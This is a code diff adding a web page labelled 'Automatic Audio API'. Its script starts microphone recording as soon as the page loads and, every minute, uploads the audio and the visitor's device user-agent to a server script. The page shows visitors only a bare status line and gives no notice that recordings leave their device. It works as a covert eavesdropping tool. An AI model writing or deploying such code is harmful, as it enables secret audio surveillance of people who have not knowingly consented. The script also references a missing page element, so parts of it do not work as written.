@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automatic Audio API</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            margin: 0;
+            padding: 20px;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            margin: auto;
+        }
+        h2 {
+            margin-bottom: 10px;
+        }
+        audio {
+            width: 100%;
+            margin-top: 10px;
+        }
+        ul {
+            list-style: none;
+            padding: 0;
+        }
+        li {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <h3 id="status">STATU: Starting...</h3>
+    
+    </div>
+
+    <script>
+        let mediaRecorder;
+        let audioChunks = [];
+        let isRecording = false;
+
+        async function getDeviceModel() {
+            return navigator.userAgent; // Device Info
+        }
+
+        async function startRecording() {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream);
+            isRecording = true;
+
+            mediaRecorder.ondataavailable = event => {
+                audioChunks.push(event.data);
+            };
+
+            mediaRecorder.start();
+
+            setInterval(() => {
+                if (isRecording) {
+                    mediaRecorder.stop();
+                    uploadAudio();
+                    audioChunks = [];
+                    mediaRecorder.start();
+                }
+            }, 60000); // Every Minute uploading to server
+
+            document.getElementById("status").innerText = "STATUS: Recording...";
+        }
+
+        async function uploadAudio() {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+            const formData = new FormData();
+            formData.append("audio", audioBlob, "recorded_audio.wav");
+
+            const deviceModel = await getDeviceModel();
+            formData.append("device_model", deviceModel);
+
+            const response = await fetch("upload.php", {
+                method: "POST",
+                body: formData
+            });
+
+            const result = await response.json();
+            if (result.success) {
+                loadAudioList();
+            }
+        }
+
+        async function loadAudioList() {
+            const response = await fetch("list.php");
+            const files = await response.json();
+            const audioList = document.getElementById("audioList");
+            audioList.innerHTML = "";
+
+            files.forEach(file => {
+                const listItem = document.createElement("li");
+                const audio = document.createElement("audio");
+                audio.controls = true;
+                audio.src = file;
+                listItem.appendChild(audio);
+                audioList.appendChild(listItem);
+            });
+        }
+
+        window.onload = () => {
+            startRecording();
+            loadAudioList();
+        };
+    </script>
+</body>
+</html>
